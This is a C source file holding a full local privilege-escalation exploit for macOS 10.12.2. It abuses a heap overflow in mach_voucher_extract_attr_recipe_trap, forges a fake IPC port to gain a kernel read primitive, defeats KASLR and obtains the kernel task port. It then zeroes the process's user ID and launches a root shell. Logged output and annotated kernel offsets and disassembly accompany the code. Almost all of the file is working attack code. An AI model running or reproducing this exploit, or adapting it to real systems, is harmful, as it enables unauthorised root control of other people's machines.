/*
 * $ sw_vers
 * ProductName:    Mac OS X
 * ProductVersion: 10.12.2
 * BuildVersion:   16C68

References:
 - https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=260804
 - https://github.com/kpwn/yalu102
 - https://googleprojectzero.blogspot.com/2017/04/exception-oriented-exploitation-on-ios.html
 - https://jaq.alibaba.com/community/art/show?articleid=781

$ ./exploit
[i] Got voucher: 1103
[i] fake_ipc_port: 0x1068bb000
[i] start page: 0x1068eb000
[i] guard page: 0x1068ec000
[i] recipe address: 0x1068ebef8
[i] Found fake_ipc_port: 0x33203
[+] leaked_ptr: 0xffffff8006424000
[+] Found kernel text: 0xffffff8005c00000
[+] KASLR slide: 0x00000005a00000
[i] tfp0: 0x33303
[+] Got root!
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <mach/mach.h>      // mach_port_allocate, mach_port_insert_right
#include <mach/mach_vm.h>   // mach_vm_read_overwrite
#include <mach-o/loader.h>  // MH_MAGIC_64

#include <sys/mman.h>       // PROT_READ, PROT_WRITE, MAP_PRIVAT, MAP_ANON
#include <assert.h>         // assert

#include <atm/atm_types.h>  // MACH_VOUCHER_ATTR_ATM_CREATE

#include "librop.h"

/* 10.12/xnu-3789.1.32/osfmk/ipc/ipc_object.h */
#define IO_BITS_ACTIVE      0x80000000  /* is object alive? */

/* 10.12/xnu-3789.1.32/osfmk/kern/ipc_kobject.h */
#define IKOT_TASK               2
#define IKOT_CLOCK              25

/* 10.12/xnu-3789.1.32/osfmk/mach/task_special_ports.h */
#define TASK_BOOTSTRAP_PORT 4   /* Bootstrap environment for task. */


#define kr32(address, value) \
    *(uint64_t*) (fake_task + 0x380) = address - 0x10; \
    pid_for_task(found_port, value);


typedef struct
{
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t desc[1];
    char pad[4096];
} oolmsg_t;

struct ipc_object
{
    natural_t io_bits;
    natural_t io_references;
    char      io_lock_data[0x100];
};

mach_port_t mport = 0;
mach_port_t tfp0 = 0;

void copyin(void *to, uint64_t from, size_t size)
{
    mach_vm_size_t outsize = size;
    size_t szt = size;
    if (size > 0x1000)
    {
        size = 0x1000;
    }
    size_t off = 0;
    while (1)
    {
        mach_vm_read_overwrite(tfp0, off + from, size, (mach_vm_offset_t)(off + to), &outsize);
        szt -= size;
        off += size;
        if (szt == 0)
        {
            break;
        }
        size = szt;
        if (size > 0x1000)
        {
            size = 0x1000;
        }

    }
}

void copyout(uint64_t to, void *from, size_t size)
{
    mach_vm_write(tfp0, to, (vm_offset_t)from, (mach_msg_type_number_t)size);
}

uint64_t ReadAnywhere64(uint64_t addr)
{
    uint64_t val = 0;
    copyin(&val, addr, 8);
    return val;
}

uint64_t WriteAnywhere64(uint64_t addr, uint64_t val)
{
    copyout(addr, &val, 8);
    return val;
}

uint32_t ReadAnywhere32(uint64_t addr)
{
    uint32_t val = 0;
    copyin(&val, addr, 4);
    return val;
}

uint64_t WriteAnywhere32(uint64_t addr, uint32_t val)
{
    copyout(addr, &val, 4);
    return val;
}

/* copy & paste from ian's PoC */
mach_port_t get_voucher()
{
    mach_voucher_attr_recipe_data_t r =
    {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = MACH_VOUCHER_ATTR_ATM_CREATE
    };
    mach_port_t p = MACH_PORT_NULL;
    kern_return_t err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&r, sizeof(r), &p);

    if (err != KERN_SUCCESS)
    {
        printf("failed to create voucher (%s)\n", mach_error_string(err));
        exit(EXIT_FAILURE);
    }
    printf("[i] Got voucher: %x\n", p);

    return p;
}


void do_overflow(uint64_t kalloc_size, uint64_t overflow_length, uint8_t *overflow_data)
{
    void *start_memory = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    void *guard_memory = mmap(NULL + PAGE_SIZE, PAGE_SIZE, PROT_NONE, MAP_ANON | MAP_PRIVATE, -1, 0);

    printf("[i] start page: %p\n", start_memory);
    printf("[i] guard page: %p\n", guard_memory);

    memset(start_memory, 0xcc, PAGE_SIZE);
    *(uint64_t *)start_memory = kalloc_size;
    uint8_t *recipe = (uint8_t *)start_memory + PAGE_SIZE - kalloc_size - overflow_length;

    printf("[i] recipe address: %p\n", recipe);
    memcpy(recipe + kalloc_size, overflow_data, overflow_length);

    kern_return_t err = mach_voucher_extract_attr_recipe_trap( mport, 1, recipe, start_memory );
}


int main(int argc, char **argv, char **envp)
{
    kernel_map_t *km = map_file("/System/Library/Kernels/kernel");
    uint64_t kernel_base_without_slide = find_symbol_address(km, "__mh_execute_header");

    mport = get_voucher();

    /* create fake port */
    struct ipc_object *fake_ipc_port = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    printf("[i] fake_ipc_port: %p\n", fake_ipc_port);

    fake_ipc_port->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
    mach_port_t *ports = calloc(800, sizeof(mach_port_t));

    for (int i = 0; i < 800; i++)
    {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
    }

    oolmsg_t msg1;
    memset(&msg1, 0, sizeof(oolmsg_t));
    oolmsg_t msg2;
    memset(&msg2, 0, sizeof(oolmsg_t));

    mach_port_t *buffer = calloc(0x1000, sizeof(mach_port_t));

    for (int i = 0; i < 0x1000; i++)
    {
        buffer[i] = MACH_PORT_DEAD;
    }

    msg1.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg1.header.msgh_local_port = MACH_PORT_NULL;
    msg1.header.msgh_size = sizeof(msg1) - 2048;
    msg1.body.msgh_descriptor_count = 1;
    msg1.desc[0].address = buffer;
    msg1.desc[0].count = 0x100 / 8; // (kalloc.256)
    msg1.desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg1.desc[0].disposition = MACH_MSG_TYPE_COPY_SEND;

    for (int i = 1; i < 800; i++)
    {
        msg1.header.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.header, MACH_SEND_MSG, msg1.header.msgh_size, 0, 0, 0, 0);
        assert(kret == 0);
    }

    for (int i = 300; i < 500; i += 5)
    {
        msg2.header.msgh_local_port = ports[i];
        kern_return_t kret = mach_msg(&msg2.header, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
        assert(kret == 0);
    }

    for (int i = 300; i < 400; i += 5)
    {
        msg1.header.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.header, MACH_SEND_MSG, msg1.header.msgh_size, 0, 0, 0, 0);
        assert(kret == 0);
    }

    do_overflow(0x100, 8, (uint8_t *)&fake_ipc_port);

    /* Find the port we overflowed */
    mach_port_t found_port = 0;
    for (int i = 300; i < 500; i++)
    {
        msg1.header.msgh_local_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.header, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
        assert(kret == 0);

        mach_port_t *rcv_port = msg1.desc[0].address;
        if (*rcv_port != MACH_PORT_DEAD)
        {
            printf("[i] Found fake_ipc_port: 0x%x\n", *rcv_port);
            if (*rcv_port)
            {
                found_port = *rcv_port;
                goto found;
            }
        }
        mach_msg_destroy(&msg1.header);
        mach_port_deallocate(mach_task_self(), ports[i]);
        ports[i] = 0;
    }
    printf("[-] Can't find overflow port.\n");
    exit(1);

found:
    ;

    for (int i = 0; i < 0x300; i++)
    {
        for (int k = 0; k < 0x40000; k += 8)
        {
            *(uint64_t *)(((uint64_t)fake_ipc_port) + 0x68) = kernel_base_without_slide + i * 0x100000 + 0x500000 + k; // ip_kobject
            *(uint64_t *)(((uint64_t)fake_ipc_port) + 0xa0) = 0xff; // ref_count

            kern_return_t kret = clock_sleep_trap(found_port, 0, 0, 0, 0);

            if (kret != KERN_FAILURE)
            {
                goto gotclock;
            }
        }
    }

    printf("[-] Can't find clock task.\n");
    exit(1);

    /* Found clock task */
gotclock:
    ;
    uint64_t leaked_ptr =  *(uint64_t *)(((uint64_t)fake_ipc_port) + 0x68);
    leaked_ptr &= ~0x3FFF;

    printf("[+] leaked_ptr: 0x%llx\n", leaked_ptr);

    /* Change our structure to ikot_task */
    fake_ipc_port->io_bits = IKOT_TASK | IO_BITS_ACTIVE;
    fake_ipc_port->io_references = 0xff;
    char *fake_task = malloc(0x1000);

    *(uint64_t *)(((uint64_t)fake_ipc_port) + 0x68) = (uint64_t) fake_task; /* ip_kobject */
    *(uint64_t *)(((uint64_t)fake_ipc_port) + 0xa0) = 0xff; /* ref_count */
    *(uint64_t *) (fake_task + 0x10) = 0xff; /* task->ref_count */

    while (1)
    {
        int32_t leaked = 0;
        kr32(leaked_ptr, &leaked);
        if (leaked == MH_MAGIC_64)
        {
            printf("[+] Found kernel text: 0x%llx\n", leaked_ptr);
            break;
        }
        leaked_ptr -= 0x4000;
    }

    uint64_t kernel_base = leaked_ptr;
    uint64_t kslide = kernel_base - kernel_base_without_slide;
    printf("[+] KASLR slide: %#016llx\n", kslide);
    uint64_t allproc = find_symbol_address(km, "_allproc") + kslide;

    uint64_t proc_ = allproc;
    uint64_t myproc = 0;
    uint64_t kern_proc = 0;

    /* Iterate until we find pid 0 */
    while (proc_)
    {
        uint64_t proc = 0;

        kr32(proc_, (int32_t *)&proc);
        kr32(proc_ + 4, (int32_t *)(((uint64_t)(&proc)) + 4));

        int pd = 0;

        kr32(proc + 0x10, (int32_t *)&pd);

        if (pd == getpid())
        {
            myproc = proc;
        }
        else if (pd == 0)
        {
            kern_proc = proc;
        }
        proc_ = proc;
    }

    uint64_t kern_task = 0;
    kr32(kern_proc + 0x18, (int32_t *)&kern_task); // proc->task
    kr32(kern_proc + 0x18 + 4 , (int32_t *)(((uint64_t)(&kern_task)) + 4));

    uint64_t itk_kern_sself = 0;
    kr32(kern_task + 0xe8, (int32_t *)&itk_kern_sself); // task->itk_sself
    kr32(kern_task + 0xe8 + 4 , (int32_t *)(((uint64_t)(&itk_kern_sself)) + 4));

    char *fake_taskport = malloc(0x1000);
    char *ktaskdump = malloc(0x1000);

    for (int i = 0; i < 0x1000 / 4; i++)
    {
        kr32(itk_kern_sself + i * 4, (int32_t *)(&fake_taskport[i * 4]));
    }

    for (int i = 0; i < 0x1000 / 4; i++)
    {
        kr32(kern_task + i * 4, (int32_t *)(&ktaskdump[i * 4]));
    }

    /* dump kernel task port */
    memcpy(fake_ipc_port, fake_taskport, 0x1000);
    memcpy(fake_task, ktaskdump, 0x1000);

    *(uint64_t *)(((uint64_t)fake_ipc_port) + 0x68) = (uint64_t) fake_task; /* ip_kobject */
    *(uint64_t *)(((uint64_t)fake_ipc_port) + 0xa0) = 0xff; /* ref_count */
    *(uint64_t *)(((uint64_t)fake_task) + 0x2b8) = itk_kern_sself; // task->itk_bootstrap

    /* Get kernel task */
    task_get_special_port(found_port, TASK_BOOTSTRAP_PORT, &tfp0);
    printf("[i] tfp0: 0x%x\n", tfp0);
    fake_ipc_port->io_bits = 0;

    /* Escalate to root */
    uint64_t ucred = ReadAnywhere64(myproc + 0xe8); // proc->ucred
    WriteAnywhere64(ucred + 0x18, 0); // ucred->cr_uid

    if (getuid() == 0)
    {
        puts("[+] Got root!");
        system("/bin/bash");
    }

    /* if we are here, exploit failed */
    return 0;
}

/*
// 10.12/xnu-3789.1.32/bsd/kern/kern_proc.c
task_t
proc_task(proc_t proc)
{
        return (task_t)proc->task;
}

__text:FFFFFF800077AD80
__text:FFFFFF800077AD80                 public _proc_task
__text:FFFFFF800077AD80 _proc_task      proc near
__text:FFFFFF800077AD80                 push    rbp
__text:FFFFFF800077AD81                 mov     rbp, rsp
__text:FFFFFF800077AD84                 mov     rax, [rdi+18h] ; proc -> task
__text:FFFFFF800077AD88                 pop     rbp
__text:FFFFFF800077AD89                 retn
__text:FFFFFF800077AD89 _proc_task      endp




// 10.12/xnu-3789.1.32/osfmk/device/iokit_rpc.c
MIGEXTERN io_object_t
iokit_lookup_object_port(
        ipc_port_t      port)
{
        io_object_t     obj;

        if (!IP_VALID(port))
            return (NULL);

        iokit_lock_port(port);
        if (ip_active(port) && (ip_kotype(port) == IKOT_IOKIT_OBJECT)) {
            obj = (io_object_t) port->ip_kobject;
            iokit_add_reference( obj );
        }
        else
            obj = NULL;

        iokit_unlock_port(port);

        return( obj );
}

__text:FFFFFF80003BE830 ; Attributes: bp-based frame
__text:FFFFFF80003BE830
__text:FFFFFF80003BE830                 public _iokit_lookup_object_port
__text:FFFFFF80003BE830 _iokit_lookup_object_port proc near     ; CODE XREF: sub_FFFFFF80003BF550+2C↓p
__text:FFFFFF80003BE830                                         ; sub_FFFFFF80003BF680+BA↓p ...
__text:FFFFFF80003BE830                 push    rbp
__text:FFFFFF80003BE831                 mov     rbp, rsp
__text:FFFFFF80003BE834                 push    r14
__text:FFFFFF80003BE836                 push    rbx
__text:FFFFFF80003BE837                 mov     rbx, rdi
__text:FFFFFF80003BE83A                 xor     r14d, r14d
__text:FFFFFF80003BE83D                 lea     rax, [rbx+1]
__text:FFFFFF80003BE841                 cmp     rax, 2
__text:FFFFFF80003BE845                 jb      short loc_FFFFFF80003BE888
__text:FFFFFF80003BE847                 lea     rdi, _iokit_obj_to_port_binding_lock
__text:FFFFFF80003BE84E                 call    _lck_mtx_lock
__text:FFFFFF80003BE853                 mov     eax, 80000FFFh
__text:FFFFFF80003BE858                 and     eax, [rbx]
__text:FFFFFF80003BE85A                 xor     r14d, r14d
__text:FFFFFF80003BE85D                 cmp     eax, 8000001Eh
__text:FFFFFF80003BE862                 jnz     short loc_FFFFFF80003BE87C
__text:FFFFFF80003BE864                 mov     rbx, [rbx+68h] ; port->ip_kobject
__text:FFFFFF80003BE868                 xor     r14d, r14d
__text:FFFFFF80003BE86B                 test    rbx, rbx
__text:FFFFFF80003BE86E                 jz      short loc_FFFFFF80003BE87C
__text:FFFFFF80003BE870                 mov     rax, [rbx]
__text:FFFFFF80003BE873                 mov     rdi, rbx
__text:FFFFFF80003BE876                 call    qword ptr [rax+20h]
__text:FFFFFF80003BE879                 mov     r14, rbx




// 10.12/xnu-3789.1.32/bsd/kern/kern_proc.c
kauth_cred_t
proc_ucred(proc_t p)
{
        return(p->p_ucred);
}

__text:FFFFFF800077ADB0                 public _proc_ucred
__text:FFFFFF800077ADB0 _proc_ucred     proc near
__text:FFFFFF800077ADB0                 push    rbp
__text:FFFFFF800077ADB1                 mov     rbp, rsp
__text:FFFFFF800077ADB4                 mov     rax, [rdi+0E8h]
__text:FFFFFF800077ADBB                 pop     rbp
__text:FFFFFF800077ADBC                 retn
__text:FFFFFF800077ADBC _proc_ucred     endp




// 10.12/xnu-3789.1.32/osfmk/ipc/ipc_port.h
struct ipc_port {
    struct ipc_object ip_object;
    struct ipc_mqueue ip_messages;
    ...
    union {
        ipc_kobject_t kobject;
        ipc_importance_task_t imp_task;
        uintptr_t alias;
    } kdata;
    ...
    #define ip_kobject      kdata.kobject (offset 0x68)
    ...




// 10.12/xnu-3789.1.32/osfmk/ipc/ipc_object.h
struct ipc_object {
    ipc_object_bits_t io_bits;
    ipc_object_refs_t io_references;
    lck_spin_t  io_lock_data;
} __attribute__((__packed__));




// 10.12/xnu-3789.1.32/bsd/sys/proc_internal.h
struct  proc {
    LIST_ENTRY(proc) p_list;    // List of all processes.

    pid_t       p_pid;          // Process identifier. (static) (offset 0x10)
    void *      task;           // corresponding task (static)  (offset 0x18)




// 10.12/xnu-3789.1.32/osfmk/kern/task.h
struct task {
        decl_lck_mtx_data(,lock)        // Task's lock
        uint32_t        ref_count;      // Number of references to me (offset 0x10)
        boolean_t       active;         // Task has not been terminated
        boolean_t       halting;        // Task is being halted
        ...
        struct ipc_port *itk_sself;     // a send right (offset 0xe8)




// 10.12.2/xnu-3789.31.2/osfmk/ipc/mach_kernelrpc.c:
436 kern_return_t
437 mach_voucher_extract_attr_recipe_trap(struct mach_voucher_extract_attr_recipe_args *args)
438 {
439         ipc_voucher_t voucher = IV_NULL;
440         kern_return_t kr = KERN_SUCCESS;
441         mach_msg_type_number_t sz = 0;
442
443         if (copyin(args->recipe_size, (void *)&sz, sizeof(sz)))
444                 return KERN_MEMORY_ERROR;
    ...
455         if (sz < MACH_VOUCHER_TRAP_STACK_LIMIT) {
                    // keep small (<256) recipes on the stack for speed
    ...
468         } else {
469                 uint8_t *krecipe = kalloc((vm_size_t)sz);
470                 if (!krecipe) {
471                         kr = KERN_RESOURCE_SHORTAGE;
472                         goto done;
473                 }
474
475                 if (copyin(args->recipe, (void *)krecipe, args->recipe_size)) {
476                         kfree(krecipe, (vm_size_t)sz);
477                         kr = KERN_MEMORY_ERROR;
478                         goto done;
479                 }
*/